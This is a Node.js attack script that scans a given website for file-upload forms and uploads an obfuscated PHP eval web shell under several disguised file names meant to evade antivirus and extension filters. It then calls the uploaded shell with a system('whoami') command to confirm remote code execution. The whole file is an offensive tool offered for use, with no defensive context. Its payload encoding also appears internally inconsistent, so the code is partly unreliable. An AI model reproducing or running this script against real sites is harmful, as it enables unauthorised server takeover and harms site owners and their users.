// tronUploader.js - Stealth Web Shell Upload (Obfuscated Mode)
const axios = require('axios');
const fs = require('fs');
const jsdom = require('jsdom');
const FormData = require('form-data');
const { JSDOM } = jsdom;

// Obfuscated shell in base64
const base64Shell = Buffer.from('<?php eval(base64_decode($_REQUEST["x"])); ?>').toString('base64');
const shellPayload = "<?php eval(base64_decode(\"" + base64Shell + "\")); ?>";

// File variants for AV evasion
const uploadVariants = [
  { name: "stealth.php", content: shellPayload },
  { name: "stealth.php.jpg", content: shellPayload },
  { name: "stealth.phtml", content: shellPayload }
];

async function tryUploadShell(baseUrl) {
  const mainPage = await axios.get(baseUrl);
  const dom = new JSDOM(mainPage.data);
  const forms = dom.window.document.querySelectorAll('form');

  let formTargets = [];
  forms.forEach(form => {
    const action = form.getAttribute('action');
    const method = form.getAttribute('method') || 'post';
    const inputs = [...form.querySelectorAll('input[type=file], input[type="file"]')];
    if (action && inputs.length > 0) {
      formTargets.push({ action, method, field: inputs[0].getAttribute('name') });
    }
  });

  if (formTargets.length === 0) {
    console.log("❌ No file upload form detected on main page.");
    return;
  }

  for (const form of formTargets) {
    const targetUrl = form.action.startsWith('http') ? form.action : new URL(form.action, baseUrl).href;
    for (const variant of uploadVariants) {
      fs.writeFileSync(variant.name, variant.content);

      const formData = new FormData();
      formData.append(form.field || "file", fs.createReadStream(variant.name), variant.name);

      try {
        console.log(`🚀 Uploading ${variant.name} to: ${targetUrl}`);
        const res = await axios.post(targetUrl, formData, { headers: formData.getHeaders(), maxRedirects: 5 });

        console.log(`✅ Upload response: ${res.status}`);
        const shellUrl = new URL(variant.name, baseUrl).href + "?x=system('whoami')";
        try {
          const shellRes = await axios.get(shellUrl);
          console.log(`🧠 Shell at ${shellUrl} → ${shellRes.data.slice(0, 100)}`);
          return;
        } catch {
          console.log(`❌ Shell not found at ${shellUrl}`);
        }
      } catch (e) {
        console.log(`❌ Upload failed to ${targetUrl}: ${e.response?.status || e.message}`);
      }
    }
  }
}

const input = process.argv[2];
if (!input) {
  console.error("❌ Provide base URL to scan.");
  process.exit(1);
}

tryUploadShell(input);
